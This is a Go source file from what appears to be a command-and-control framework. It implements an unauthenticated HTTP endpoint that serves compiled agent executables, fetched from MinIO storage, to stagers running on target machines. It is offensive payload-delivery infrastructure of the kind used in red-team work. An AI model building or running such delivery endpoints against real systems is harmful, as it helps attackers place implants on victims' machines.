package api

import (
	"context"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/storage"
	"github.com/minio/minio-go/v7"
	"go.uber.org/zap"
)

// handleStage serves a compiled agent PE to a staged-payload stager.
// The build UUID is baked into the stager binary and acts as the capability token.
// No JWT auth: the stager runs on target before any operator session exists.
func (s *C2Server) handleStage(w http.ResponseWriter, r *http.Request) {
	buildUUID := strings.TrimPrefix(r.URL.Path, "/stage/")
	buildUUID = strings.TrimSpace(buildUUID)

	// Minimal UUID shape check before hitting the DB.
	if len(buildUUID) != 36 ||
		buildUUID[8] != '-' || buildUUID[13] != '-' ||
		buildUUID[18] != '-' || buildUUID[23] != '-' {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()

	var status, artifactURL string
	err := db.Pool.QueryRow(ctx,
		`SELECT status, COALESCE(artifact_url,'') FROM builds WHERE build_uuid = $1`,
		buildUUID,
	).Scan(&status, &artifactURL)
	if err != nil || status != "complete" || artifactURL == "" {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	objectKey := artifactObjectKey(artifactURL)
	if objectKey == "" {
		s.log.Warn("stage: cannot parse object key", zap.String("uuid", maskUUID(buildUUID)))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	obj, err := storage.Client.GetObject(ctx, storage.BucketArtifacts, objectKey, minio.GetObjectOptions{})
	if err != nil {
		s.log.Warn("stage: minio GetObject", zap.String("uuid", maskUUID(buildUUID)), zap.Error(err))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	defer obj.Close()

	stat, err := obj.Stat()
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.FormatInt(stat.Size, 10))
	w.WriteHeader(http.StatusOK)
	io.Copy(w, obj) //nolint:errcheck
}

// artifactObjectKey extracts the MinIO object name from an artifact_url.
// artifact_url is either:
//   - a presigned HTTP URL: http://host/artifacts/<objectKey>?...
//   - a minio:// URI: minio://artifacts/<objectKey>  (legacy UploadBytes format)
func artifactObjectKey(artifactURL string) string {
	// Presigned HTTP URL: .../artifacts/<key>?...
	if idx := strings.Index(artifactURL, "/artifacts/"); idx >= 0 {
		rest := artifactURL[idx+len("/artifacts/"):]
		if q := strings.Index(rest, "?"); q >= 0 {
			rest = rest[:q]
		}
		if rest != "" {
			return rest
		}
	}
	// minio:// URI fallback
	if strings.HasPrefix(artifactURL, "minio://artifacts/") {
		return strings.TrimPrefix(artifactURL, "minio://artifacts/")
	}
	return ""
}

// maskUUID replaces the last 12 chars of a UUID with asterisks for logging.
func maskUUID(u string) string {
	if len(u) < 12 {
		return "***"
	}
	return u[:len(u)-12] + "***"
}
